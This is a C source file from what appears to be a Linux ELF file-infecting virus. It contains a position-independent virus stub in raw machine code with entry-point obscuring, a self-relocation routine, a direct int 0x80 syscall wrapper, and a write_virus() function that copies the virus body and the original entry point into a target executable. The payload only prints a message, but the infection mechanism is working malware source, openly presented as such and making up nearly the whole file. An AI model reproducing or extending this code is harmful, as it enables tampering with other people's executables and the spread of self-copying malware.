#define SYS_WRITE 4
#define STDOUT 1

const char mesaj[];
int call_syscall(int,...);

/* void start_virus() {} */
const unsigned char virus_code[]
__attribute__ (( aligned(8), section(".text") )) =
{
  0x68,0x00,0x00,0x00,0x00,      /* 08048080: push dword 0x0         */
  0x9C,                          /* 08048085: pushf                  */
  0x60,                          /* 08048086: pusha                  */
  0xE8,0x04,0x00,0x00,0x00,      /* 08048087: call 0x8048090         */
  0x61,                          /* 0804808C: popa                   */
  0x9D,                          /* 0804808D: popf                   */
  0xC3,                          /* 0804808E: ret                    */
  0x90                           /* 0804808F: nop                    */
}; /* 16 bytes (0x10) */

/* here comes the virus body which is in virus_code the procedure : call 0x8048090 
 * the virus body simply calls the sysfunction sys.write to print out our dear
 * string ( mesaj ) 
*/

void virus_body(void)
{
	int offset=get_relocate_offset();
	const char *msg=offset+mesaj;
	call_syscall(SYS_WRITE,STDOUT,msg,35);       /* payload ;) */
	
	                                /* 35 = strlen(msg) ...but the implementation
					 * : strlen(msg) didnt work so i had to do that 
					 * per hand ;( .maybe you could improve that ...*/
	
}

/* here we'll compare the actual value of IP ( Instruction Pointer ) which the location
 * of "test_me" which the compiler had in mind when it build the executable.
 * at the end result should be 0
*/

int get_relocate_offset()
{
	int result;
	__asm__(
		"call test_me;"
		"test_me:     "
		"pop %%eax   ;"
		"sub $(test_me),%%eax;"
		:"=a" (result)
		);
	return result;
}

/* this a simple version of syscall ...
 * after all we'll use this function only for printing out our string
 * so we dont care about the error messaged which might have occured
 * during the execution.
*/

int call_syscall(int nr,...)
{
	register int result;    /* return value */
	asm("push %ebx; push %esi; push %edi");     /* save all registers... */
	
	/* well we'll use this function only the syscall sys_write...
         * so here are the description of the commands... */
	
	asm(
	    "mov 28(%%ebp),%%edi;"
	    "mov 24(%%ebp),%%esi;"
	    "mov 20(%%ebp),%%edx;"    /* move size of data to write to edx */
	    "mov 16(%%ebp),%%ecx;"    /* move address of data ecx */
	    "mov 12(%%ebp),%%ebx;"    /* move file descriptor(where to write data) to ebx */ 
	    "mov 8(%%ebp),%%eax;"     /* move syscall number defined is /usr/include/asm/unistd.h to eax */
	    "int $0x80"
	    : "=a" (result)
	    );
	
	asm("pop %edi; pop %esi; pop %ebx");      /* restore saved registers */
	return result;
}

/* our dear string... */
const char mesaj[] __attribute__ ((section(".text")))="::: Caline I Miss You (Cyneox) :::\n";

/* end_virus is the address where we stop with copying our virus to file...
 * its a simple implementation how to determinate the end of our virus code...
*/

void end_virus() {}

/* --------------- write_virus ------------------ */
bool write_virus(Infect *file)
{
	int offset=get_relocate_offset();
	char *virus_begin=offset + (char*)&virus_code;
	char *virus_end=offset + (char*)&end_virus;
	unsigned int virus_size=virus_end - virus_begin;

	/* write first byte of char virus_code = "push" */
	write(file->fd_dest,virus_begin,1);

	/* write our original entry point for EPO */
	write(file->fd_dest,&file->origin_entry,sizeof(file->origin_entry));
	
#ifdef DEBUG_IT
	printf("....:::: [ write_virus ] ::::....\n");
        printf("offset     = %d\n",offset);
	printf("virus_begin= %x\n",virus_begin);
	printf("virus_end  = %x\n",virus_end);
	printf("virus_code = %p\n",virus_code);
	printf("virus_body = %p\n",&virus_body);
	printf("get_relocate_offset = %p\n",&get_relocate_offset);
	printf("call_me    = %p\n",&call_syscall);
	printf("mesaj      = %p\n",mesaj);
	printf("end_virus  = %p\n",&end_virus);
	printf("write_virus= %p\n",&write_virus);
	printf("virus_size = %d\n",virus_size);
#endif
	
	/* now write the virus code ... */
	write(file->fd_dest,virus_begin+1,virus_size-1);

	return true;
}
	
